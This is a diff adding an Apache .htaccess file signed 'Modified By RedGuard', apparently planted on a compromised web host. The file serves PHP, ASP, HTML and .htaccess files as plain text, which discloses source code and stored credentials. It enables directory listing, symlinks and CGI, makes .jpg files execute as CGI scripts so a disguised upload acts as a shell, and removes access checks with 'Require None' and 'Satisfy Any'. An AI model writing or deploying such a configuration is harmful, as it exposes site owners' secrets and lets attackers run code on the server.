@@ -1,0 +1,22 @@
+Addhandler Modified By RedGuard 
+# For security reasons, Option followsymlinks cannot be overridden.
+# Options +FollowSymLinks 
+ Options +SymLinksIfOwnerMatch
+ DirectoryIndex 1.txt 
+ Options +Indexes 
+ Options +ExecCGI 
+ AddType text/plain .php 
+ AddType text/plain .asp 
+ AddType text/plain .htm 
+ AddType text/plain .shtml 
+ AddType text/plain .shtm 
+ AddType text/plain .htaccess 
+ AddHandler server-parsed .php 
+# For security reasons, Option followsymlinks cannot be overridden.
+# Options FollowSymLinks MultiViews Indexes ExecCGI 
+ Options SymLinksIfOwnerMatch MultiViews Indexes ExecCGI
+ AddType application/x-httpd-cgi .jpg 
+ AddHandler cgi-script .jpg 
+ AddHandler cgi-script .jpg 
+ Require None 
+ Satisfy Any
